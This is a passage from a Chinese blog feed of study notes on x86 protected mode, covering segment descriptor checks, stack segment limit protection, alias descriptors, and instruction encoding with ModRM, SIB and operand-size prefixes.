W A), 接着按下表检查描述符的类型与段寄存器是否匹配<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/7f3245ca542c143d7664e8a2f4f92e11.png" class=""><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/834979e102d8631b7557cc77b899c79c.png" class=""></li></ol></li><li><p>检查描述符中的<mark>P位</mark>是否为1, 若为0表示虽然描述符已经定义, 但是它对应的段并不存在物理内存中, 此时处理器终止处理并引发<mark>11号中断</mark>. 一般来说需要定义一个中断处理程序接管<mark>11号中断</mark>,  在中断处理的过程中把该描述符所对应的段从外部硬盘等存储器中调入内存, 然后将<mark>P位</mark>置1. 这种类型的中断返回时并不是返回到下一条指令二十返回到引起中断的那条指令, 这次就可以重新加载描述符到段寄存器了. 如果<mark>P位=1</mark>处理器将描述符加载到段描述符对应的描述符高速缓存器中, 同时将<mark>A位</mark>置1.<br>代码段在<mark>R=1</mark>的时候类似于只读存储器ROM可以使用段超越前缀CS来读取其中的内容也可以将它们的描述符选择子加载到<mark>DS ES FS GS</mark>来作为数据段访问, 但是代码段在任何时候都是不可写的.</p></li><li><p>一旦上述验证全部通过, 处理器就将<mark>段选择子</mark>加载到<mark>段寄存器</mark>的<mark>段选择器</mark>中.</p></li></ol><p>另外还有一些注意事项:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/0eb3ec5d63e3e3e6cd184b56a6239824.png" class=""><h2 id="03-代码段执行时的保护"><a href="#03-代码段执行时的保护" class="headerlink" title="03. 代码段执行时的保护"></a>03. 代码段执行时的保护</h2><p>进入保护模式之后转移指令<code>jmp 0x0010:flush</code>会修改段寄存器CS, 会进行一系列检查工作:</p><ul><li>首先选择子<mark>0x0010</mark>指定的描述符不能超过描述符表的边界;</li><li>其次指定的描述符必须是代码段描述符, 相关的信息必须是完整且合法的;</li><li>还要检查偏移量flush是否超出了当前段的界限. 因为是刚进入保护模式, CS的描述符高速缓存器中的内容还是之前的值, 段界限是<mark>0XFFFF</mark>.<br>一旦通过了检查, 就将<mark>选择子0x0010</mark>带入<mark>CS的段选择器</mark>, 并用描述符填充描述符高速缓存器, 接着用偏移量<mark>flush</mark>修改指令指针寄存器<mark>EIP</mark>, 处理器立即转入目标位置处执行.<br>因为这一条指令刷新了段寄存器<mark>CS</mark>, 导致处理器到一个新的代码段执行.<br>这个描述符指定了<mark>D位是1</mark>表示处理器的默认操作尺寸是32位的, 因为这个描述符所指定的段在<mark>jmp</mark>指令之前是在16位操作尺寸下运行的, 之后是在32位操作尺寸下运行的.<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/896a649a211d80d2b5e6992a385fe38c.png" class="">在保护模式下一旦相应的描述符被加载到CS描述符高速缓存器中, 则处理器取指令和执行指令的时候就不在访问描述符表, 二十直接使用CS描述符高速缓存器的内容, 从中取得线性基地址同指令指针寄存器<mark>EIP</mark>的值相加形成32位线性基地址, 从内存中取得下一条指令.</li></ul><p>在执行下一条指令之前, 处理器也要检查指令的地址是否有效, 以防止执行超出允许范围之外的指令. </p><p>每个段都有其段界限, 位于其描述符中实际使用的段界限其粒度取决于描述符的<mark>G位</mark>, 实际使用的段界限也要满足于<mark>0 &lt; EIP+指令长度-1 &gt;实际使用的段界限</mark>. </p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/77aebdb7c57f5f90aec1ef93d6cd2f83.png" class=""><h2 id="04-用向上扩展的段作为栈段"><a href="#04-用向上扩展的段作为栈段" class="headerlink" title="04. 用向上扩展的段作为栈段"></a>04. 用向上扩展的段作为栈段</h2><p>选择<mark>01号</mark>描述符</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/faa6ecfdc04064593c2187538b016d53.png" class=""><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/20d38262af60146b85491f4fc9e35560.png" class=""><p>查看<mark>01号段描述符</mark></p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/9bb7c4ee6942d6799ec345ab5722dbec.png" class=""><ul><li><strong>基地址</strong>: 为0x00000000</li><li><strong>S位</strong>: 为1</li><li><strong>X位</strong>: 为0, 表示数据段</li><li><strong>E位</strong>: 为0, 表示向上扩展</li><li><strong>段界限</strong>: 为0xFFFFF</li><li><strong>G位</strong>: 为1, 表示段的粒度为4K字节, 段界限是以4K字节为单位<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/72cf5620753aad0a89a78fff765bab5b.png" class=""></li></ul><p>这个数据段所占用的空间与之前的代码段重叠了, 我们知道代码段是不允许写入的, 但是不允许写入指的是不允许通过代码段的描述符来写入代码段, 是可以通过这个重叠的4G字节的数据段来写入代码段. </p><p>设置栈段:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/5f6bc86c2b0bbfa28ae3ced5216d4e23.png" class=""><p>二进制<mark>11</mark>是第四个描述符</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/9d4184077cda167885a8ad7a748e3cf7.png" class=""><ul><li><strong>X位</strong>: 为0, 表示为数据段</li><li><strong>B位(因为是数据段所以D/B位是B位)</strong>: 为1表示使用<mark>ESP</mark>(为0则使用SP)</li><li><strong>E位</strong>: 为0, 表示是向上扩展的段</li><li><strong>基地址</strong>: 为0x00006C00</li><li><strong>段界限</strong>: 为0x007FF</li><li><strong>G位</strong>: 为0, 表示段界限的粒度以字节为单位</li></ul><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/c07413ae69547ac24bc35c6478c45746.png" class=""><center>这个栈段是数据段, 共2K字节</center><p>栈的<mark>扩展方向</mark>和<mark>推进方向</mark>不同, 段扩展方向不是数据的读写方向, 而是用来定义偏移量的范围, 界限检查.<br>段的扩展方向决定了处理器如何对段的访问进行检查</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/992185c00e3d10260709cc14bfc4af81.png" class=""><p>因为这是数据段, 所以是B位, 且B位的值为1, 表示使用ESP当作栈的指针, 所以要设置ESP的初始值为段的大小(段界限0x7FF + 1 = 0x800 = 2048). </p><h2 id="05-向上扩展的段作为栈段时的保护"><a href="#05-向上扩展的段作为栈段时的保护" class="headerlink" title="05. 向上扩展的段作为栈段时的保护"></a>05. 向上扩展的段作为栈段时的保护</h2><p>上一节中使用的栈段为2K字节:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/38ecf365ff993ff5e8cc0d71e3e3c4b8.png" class=""><p>且使用<mark>ESP</mark>当作栈指针寄存器来进行隐式的栈操作指令, 如:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/3dbad33e467a13c4c8bb0f56683128b9.png" class=""><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/650aa3cfe536d7e955920ed47a12a600.png" class=""><p>这些指令操作时, 会对栈进行压栈, 出栈.</p><p>使用下列两条代码演示栈的检查:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/1b581c0afc4c2bc3e56eb88b6ea86b95.png" class=""><p>在压入时对偏移量进行检查:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/0da722cc7dd0fd58228cd9a0786f8b37.png" class=""><p>第一条指令压栈后的状态, 和检查过程:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/5233807d22ddc7f010f94b872ed3e281.png" class=""><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/9e8bead96b7411a85c63c58a3f574449.png" class=""><p>正好符合使用界限的要求, 若将<mark>ESP</mark>的初始值设置为大于0x800比如<mark>0x802</mark>, 再进行压栈指令操作时就会将数据压入到边界之外, 会导致处理器产生中断.</p><h2 id="06-访问普通数据段时的保护"><a href="#06-访问普通数据段时的保护" class="headerlink" title="06. 访问普通数据段时的保护"></a>06. 访问普通数据段时的保护</h2><p>将上一节压入的数据弹出:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/c8cd77849769d1fb3edd1e0250dc51e6.png" class=""><p>当前栈的布局:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/e8328caac6a6420bd869459b6bd1b079.png" class=""><p>首先需要检查出栈的数据是否超出栈的边界:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/0666f08ce296096fab463e028efe3114.png" class=""><p>检查通过之后:<br>    1. 使用<mark>SS</mark>的基地址<mark>0x00006C00</mark>加上当前<mark>ESP</mark>中的偏移值<mark>0x07F8</mark>得到有效地址<mark>0x00073F8</mark>, 从这个地址处出去四个字节数据.<br>    2. 之后使用默认的数据段<mark>DS</mark>段地址<mark>0x00000000</mark>加上指令中给出的偏移量<mark>0x0B800</mark>得到有效地址为<mark>0x000B8000</mark>, 将栈中弹出的数据写入此处.<br>    <img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/1966f897d44a0bafbb6c4950cbe27596.png" class=""><br>    在写入之前, 处理器要检查是否会超出段界限之外:<br>    <img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/df76be4458212651a62defd71f6b34c4.png" class=""><br>    写入之后数据段<mark>DS</mark>的状态:<br>    <img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/6a19b8a2865e1c148aede31b98375256.png" class=""><br>    3. 出栈之后, 处理器将<mark>ESP的值加4</mark>变为<mark>0x07FC</mark><br>    <img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/36ee499be6eca2ea474c7240d2343bef.png" class=""></p><h2 id="07-内存线性地址的回绕特性"><a href="#07-内存线性地址的回绕特性" class="headerlink" title="07. 内存线性地址的回绕特性"></a>07. 内存线性地址的回绕特性</h2><p>段的逻辑地址为<mark>0x00000000</mark>, 加上右边的偏移量, 得到逻辑地址</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/fcb649fcc68631430ba4a99f986defb7.png" class=""><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/0e52729cf791d29491cad920d07b0c53.png" class=""><p>还可以使用下列方式表示偏移量:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/483ed43e4cf752c5847ddb7949b0e895.png" class=""><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/7b46f7ff6dfa07da667fc96c766bcea2.png" class=""><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/ef863300690948d99350071f8d5464b3.png" class=""><h2 id="08-用向下扩展的段作为栈段"><a href="#08-用向下扩展的段作为栈段" class="headerlink" title="08. 用向下扩展的段作为栈段"></a>08. 用向下扩展的段作为栈段</h2><p>之前使用向上扩展的段作为栈段, 大小为2K字节.</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/e62ebf4b9bfa8ca5424718326670afec.png" class=""><p>描述符:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/2951d97f1dd24b7c5e9cf3b6d522fecf.png" class=""><ul><li>S位: 为1, 表示为寄存器的段描述符</li><li>X位: 为0, 表示数据段描述符, 为1表示是代码段描述符</li><li>E位: 为0, 表示是向上扩展的段, 为1表示是向下扩展的段<br>向下扩展的数据段实际允许使用的偏移量范围 = 实际允许使用的段界限 + 1开始的, 段内偏移量的最大值为<mark>0xFFFF</mark>或<mark>0xFFFFFFFF</mark>.<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/15f11c6a8e4dbf4ebd18d79a9f2aecff.png" class=""></li></ul><p>对于向下扩展的段:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/7c598377dd29fff913aca0e7d63b922f.png" class=""><p>程序中使用的第二个栈段:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/dc8055320b99f5258a5a34c8309a7f0d.png" class=""><p>程序中使用的第二个栈段描述符:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/391097b5520370f4dc8a85612f2a0535.png" class=""><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/ff70bd2dd24a02e094faf74301722bfb.png" class=""><ul><li>S位: 为1, 表示存储器的段描述符</li><li>X位: 为0, 表示数据段</li><li>段基地址: <mark>0x00007C00</mark></li><li>E位: 为1, 表示向下扩展</li><li>W位: 为1, 表示可读可写</li><li>段界限: <mark>0xFFFFFE</mark></li><li>G位: 为1, 表示粒度以<mark>4K字节</mark>为单位</li><li>B位: 为1, 表示偏移量理论最大值是<mark>0xFFFFFFFF</mark>, 而且使用<mark>ESP</mark>位栈指针</li></ul><p>这个栈段的状态如下图:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/440c379626a7dfa235d192c8f824473c.png" class=""><p><mark>ESP</mark>的值要设置为栈的最大界限值 + 1: <mark>0xFFFFFFFF +1 = 0x00000000</mark>.</p><h2 id="09-向下扩展的段作为栈段时的保护"><a href="#09-向下扩展的段作为栈段时的保护" class="headerlink" title="09. 向下扩展的段作为栈段时的保护"></a>09. 向下扩展的段作为栈段时的保护</h2><p>上一节中设置的栈:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/609e6f5a2b3b335d37cfc7ebdd66a3ab.png" class=""><p>使用下列指令执行压栈操作:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/4c5d56edda424f8df68ea1ca6ab0198f.png" class=""><p>在执行压栈指令时, 需要对压入的数据进行检查, 以确定不会超出段的界限:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/1d603df7aad64f9f9229d01c24dec8ef.png" class=""><p>具体为处理器先执行<mark>ESP - 4 = 0xFFFFFFFC</mark>, 0xFFFFFFFC &gt; 实际使用的段界限<mark>0xFFFFEFFF</mark>, 符合上述条件执行压栈操作. </p><p>接下来处理器使用段的基地址<mark>0x00007C00 + 0xFFFFFFFC = 0x00007BFC</mark>, 从这里写入数据.</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/68e0568c6fec5a195b57dbbf16cff16c.png" class=""><p>压栈后执行出栈操作</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/e2b58c0ed6456f11f738e4b8750a63ee.png" class=""><p>出栈:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/1bc297a853f54a8a2bb0571e725d96c9.png" class=""><h2 id="10-通过别名来实现段的共用和共享"><a href="#10-通过别名来实现段的共用和共享" class="headerlink" title="10. 通过别名来实现段的共用和共享"></a>10. 通过别名来实现段的共用和共享</h2><p>在保护模式下不能使用<mark>CS</mark>来修改内存, 但是可以设置一个代码段的别名描述符, 将其<mark>X位</mark>设置为0表示数据段, 这样就可以通过<mark>ES</mark>来访问字符串所在的内存位置, 以达到修改内存的操作.</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/e180b2058d4d9b11287f912eff746810.png" class=""><h2 id="11-冒泡排序的基本原理"><a href="#11-冒泡排序的基本原理" class="headerlink" title="11. 冒泡排序的基本原理"></a>11. 冒泡排序的基本原理</h2><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/b2e5460885bf9342412d042119339c1c.png" class=""><h2 id="12-32位操作尺寸下的LOOP指令"><a href="#12-32位操作尺寸下的LOOP指令" class="headerlink" title="12. 32位操作尺寸下的LOOP指令"></a>12. 32位操作尺寸下的LOOP指令</h2><p>如果<mark>CS</mark>高速缓存器中的<mark>D位为0</mark>表示使用16位操作尺寸, <mark>loop</mark>指令使用<mark>cx</mark>计数, 如果<mark>D=1</mark>那么表示使用32位操作尺寸, <mark>loop</mark>使用<mark>ecx</mark>计数.<br>冒泡排序循环:@@1处</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/0d588a106bd54741185f3e6945c1fa73.png" class=""><p>冒泡排序内循环: @@2处</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/390dc92a8ce50d36c122e217c6b526f7.png" class=""><p>其中外循环比较次数: 可以看出内循环比较次数和外循环的<mark>ECX</mark>相同</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/6e3b915f0449d48ab3a7a5e202898502.png" class=""><p>冒泡内循环比较过程:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/ec0258efab5eb24c7d5d9328f7f60598.png" class=""><h2 id="13-数据交换指令XCHG"><a href="#13-数据交换指令XCHG" class="headerlink" title="13. 数据交换指令XCHG"></a>13. 数据交换指令XCHG</h2><p><mark>XCHG</mark>指令: 操作数不能同时为内存地址</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/image-20221113170928597.png" class="" title="image-20221113170928597">]]></content>
      
      
      <categories>
          
          <category> Windows保护模式 </category>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> X86汇编语言：实模式到保护模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>23-指令的格式及其操作尺寸</title>
      <link href="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/"/>
      <url>/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/</url>
      
        <content type="html"><![CDATA[<h2 id="01-80286的16位保护模式"><a href="#01-80286的16位保护模式" class="headerlink" title="01. 80286的16位保护模式"></a>01. 80286的16位保护模式</h2><ol><li>80286的寄存器和8086有同样的寄存器</li></ol><span id="more"></span><img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/19a8384787871958c502d877f35a4395.png" class="" title="寄存器"><pre><code>      2. 80286的描述符有48位     {% asset_img 89ef06a022ca9dfcc82e9db73a4dbd5a.png 80286描述符格式 %}      3. 80286也引入了描述符, 描述符表, 描述符高速缓存器, 段选择子的概念          {% asset_img 50daf97b92479e82b0a8e32a76b16a03.png  %}      4. 80286的地址线有24位可以寻址16M空间的任意地址, 但是只有16位偏移, 所以确定了段地址后只能在1M的空间内偏移          {% asset_img 8a96c9a8dc8774e1d9b3161716de41f8.png  %}          {% asset_img 7cafe51b7eda396fb20e58546a24b41f.png  %}</code></pre><h2 id="02-16位处理器的指令操作尺寸"><a href="#02-16位处理器的指令操作尺寸" class="headerlink" title="02. 16位处理器的指令操作尺寸"></a>02. 16位处理器的指令操作尺寸</h2><pre><code>    1.指令的操作尺寸</code></pre><img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/1bccd1d8b1b5610e78941eba1174502c.png" class=""><pre><code>    2.  描述符高速缓存器中的基地址在实模式和保护模式下是不同的:        **实模式**: 是将段地址左移四位得到的        **保护模式**: 来自段描述符高速缓存器, 段描述符的内容由段选择子带入段选择器中, 从描述符表中取出对应的描述符放入段描述符高速缓存器中    3. 16位处理器的操作数尺寸可以是8, 16位的, 有效地址的尺寸始终是16位</code></pre><img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/d4d3c29d497abddf63260e021521a7e0.png" class=""><h2 id="03-32位处理器的指令操作尺寸"><a href="#03-32位处理器的指令操作尺寸" class="headerlink" title="03. 32位处理器的指令操作尺寸"></a>03. 32位处理器的指令操作尺寸</h2><ul><li>32位处理器的操作数尺寸可以是8, 16, 32位的, 有效地址的尺寸可以是16位或32位的</li></ul><h2 id="04-x86的指令格式ModRM和偏移量部分"><a href="#04-x86的指令格式ModRM和偏移量部分" class="headerlink" title="04. x86的指令格式ModRM和偏移量部分"></a>04. x86的指令格式ModRM和偏移量部分</h2><ul><li>opcode的查询方法<a href="https://www.intel.cn/content/www/cn/zh/developer/articles/technical/intel-sdm.html">手册下载地址</a></li></ul><h2 id="05-x86的指令格式-ModRM和偏移量部分"><a href="#05-x86的指令格式-ModRM和偏移量部分" class="headerlink" title="05. x86的指令格式-ModRM和偏移量部分"></a>05. x86的指令格式-ModRM和偏移量部分</h2><ul><li>转换汇编到数字编码<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/d762141af15edd7381c9552dfed974d8.png" class=""><img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/8590328752000f9c7081b52539010081.png" class="" title="偏移/指令扩展"></li></ul><h2 id="6-x86的指令格式-SIB部分"><a href="#6-x86的指令格式-SIB部分" class="headerlink" title="6. x86的指令格式-SIB部分"></a>6. x86的指令格式-SIB部分</h2><img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/910907ba66449818ba2b68ed5c6f6e17.png" class="" title="SIB部分"><p>SIB字段格式:</p><img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/9f401588847b917a34efd2b77179a516.png" class="" title="SIB格式"><img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/9d1d27fe7929e797f44ddda3482d5dcf.png" class=""><h2 id="07-x86的指令格式-指令前缀部分"><a href="#07-x86的指令格式-指令前缀部分" class="headerlink" title="07. x86的指令格式-指令前缀部分"></a>07. x86的指令格式-指令前缀部分</h2><ul><li>指令前缀：段超越前缀、总线封锁前缀、数据传送指令的重复前缀、操作尺寸反转前缀、地址尺寸反转前缀等等。指令最多有4个前缀。<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/97cd999ec795a80629068bd3b2800cbf.png" class=""><img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/8bba030575474d4db587df5c6466c781.png" class=""> </li><li>课后练习:<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/db3b39993bc34078e3043c90f7741bac.png" class=""></li></ul><h2 id="08-处理器的默认操作尺寸和相关指令前缀"><a href="#08-处理器的默认操作尺寸和相关指令前缀" class="headerlink" title="08. 处理器的默认操作尺寸和相关指令前缀"></a>08. 处理器的默认操作尺寸和相关指令前缀</h2><ul><li>处理器默认操作尺寸, 可以添加前缀66(数据), 67(地址)来反转操作尺寸(16or32)</li><li>上节课后练习答案:<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/3a2b90f96475ef1d040464aaca04e702.png" class="">之前讲过的操作尺寸：<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/b169c1846704eda0f389d538be7a6591.png" class="">16位、32位操作尺寸：<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/d379ff3ee0e2c162f46dc1d835e00d3b.png" class="">默认操作尺寸：<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/7d78596ddce36251b1e265008a4df9e2.png" class="">所以上节习题中：<ol><li>默认操作尺寸是16位时: <img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/a77e8777d90139fd84264432680e7e3d.png" class=""></li><li>默认操作尺寸是32位时:<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/6ad1a89e5472a6f8693004e3df9525e7.png" class=""></li></ol></li><li>前缀<mark>66</mark>用来反转<mark>操作数</mark>的尺寸</li><li>前缀<mark>67</mark>用来反转<mark>有效地址</mark>的尺寸</li></ul><h2 id="09-用伪指令bits生成16位和32位模块"><a href="#09-用伪指令bits生成16位和32位模块" class="headerlink" title="09. 用伪指令bits生成16位和32位模块"></a>09. 用伪指令bits生成16位和32位模块</h2><ul><li>相同机器指令对应不同汇编指令：<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/efd4e008221e2fc9f311bf7a6f33149a.png" class=""></li><li>相同机汇编指令对应不同机器指令：<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/4227a74b5c2cdb89081d296ebaadf03d.png" class=""></li></ul><pre><code>    bits 16;也可写为[bits 16],若为第一条[bits 16]指令也可省略；                ;因为默认使用[bits 16]编译程序    mov ax, [bx+si]        bits 32;也可写为[bits 32]    mov ax, [bx+si]</code></pre><h2 id="10、描述符和段描述符高速缓存器的D位"><a 